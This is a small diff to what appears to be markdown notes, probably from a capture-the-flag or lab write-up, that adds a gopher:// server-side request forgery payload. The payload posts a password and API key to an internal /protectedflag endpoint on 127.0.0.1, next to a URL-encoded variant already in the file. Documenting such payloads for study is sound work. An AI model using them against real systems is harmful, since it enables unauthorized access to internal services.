@@ -164,6 +164,10 @@ gopher://127.0.0.1:80/_GET%20/target%20HTTP/1.1%0a
 ```
 
 ```shell
+gopher://127.0.0.1:80/_POST /protectedflag HTTP/1.1\npassword=twasbryllyg\napiKey=chesirecat
+```
+
+```shell
 gopher%253A%252F%252F127.0.0.1:80/_GET%20/protectedflag%20HTTP/1.1%0apassword%253Dtwasbryllyg%0aapiKey%253chesirecat
 ``` 
 
